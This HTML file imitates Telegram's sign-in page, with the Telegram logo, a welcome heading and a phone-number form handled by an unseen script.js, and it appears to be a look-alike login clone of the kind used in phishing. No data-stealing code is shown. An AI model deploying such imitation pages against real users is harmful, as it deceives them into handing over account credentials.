<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram - Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/Telegram_logo.svg/512px-Telegram_logo.svg.png" alt="Telegram Logo" />
        </div>
        <h1>Welcome to Telegram</h1>
        <p>Enter your phone number to sign in</p>
        <form id="loginForm">
            <input type="text" id="phoneNumber" placeholder="Phone number" required><br>
            <button type="submit">Next</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
